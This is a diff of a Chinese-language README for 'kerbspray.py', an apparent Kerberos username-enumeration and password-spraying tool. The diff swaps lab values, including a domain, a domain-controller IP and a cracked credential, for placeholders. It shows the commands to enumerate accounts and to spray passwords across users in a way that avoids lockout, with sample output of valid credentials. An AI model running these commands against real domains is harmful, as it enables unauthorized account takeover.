@@ -23,21 +23,21 @@ python3 kerbspray.py -d 域名 -dc 域控IP -u 用户文件 -p 密码文件 [选
 先看看哪些账号存在，不碰密码，不会触发锁定：
 
 ```bash
-python3 kerbspray.py -d xuegod.cn -dc 192.168.111.72 -u user.txt --enum-only
+python3 kerbspray.py -d xxxx.com -dc 192.168.18.72 -u user.txt --enum-only
 ```
 
 ```text
-[*] Target Domain: XUEGOD.CN, DC: 192.168.111.72
+[*] Target Domain: xxxx.com, DC: 192.168.18.72
 [*] Enumeration mode: Checking 4 users...
 [*] Starting 10 threads, total 4 tasks...
 
 [*] Scan completed.
 [+] Existing users: 2
     guest
-    win10
+    JACK
 [-] Non-existing users: 2
-    mk
     EOF
+    Tssrump
 ```
 
 ### 密码喷洒
@@ -45,17 +45,17 @@ python3 kerbspray.py -d xuegod.cn -dc 192.168.111.72 -u user.txt --enum-only
 加 `--reverse` 就是「一个密码 × 所有用户」，把尝试分散到不同账号，防锁定。不加的话是「一个用户 × 所有密码」，容易把账号锁了，一般别这么用。
 
 ```bash
-python3 kerbspray.py -d xuegod.cn -dc 192.168.111.72 -u user.txt -p pass.txt --reverse -t 20
+python3 kerbspray.py -d xxxx.com -dc 192.168.18.72 -u user.txt -p pass.txt --reverse -t 20
 ```
 
 ```text
-[*] Target Domain: XUEGOD.CN, DC: 192.168.111.72
+[*] Target Domain: xxxx.com, DC: 192.168.18.72
 [*] Starting 20 threads, total 4 tasks...
-[+] win10:xuegod@123 -> SUCCESS
+[+] jack:jackma -> SUCCESS
 
 [*] Scan completed.
 [+] Valid credentials found:
-    win10:xuegod@123
+    jack:jackma
 
 [*] Failure breakdown:
     KDC_ERR_C_PRINCIPAL_UNKNOWN - Client not found in Kerberos database x 2
@@ -63,7 +63,7 @@ python3 kerbspray.py -d xuegod.cn -dc 192.168.111.72 -u user.txt -p pass.txt --r
 
 [!] Users that DO NOT exist (consider removing from user list):
     EOF
-    mk
+    Tssrump
 ```
 
 ## 选项
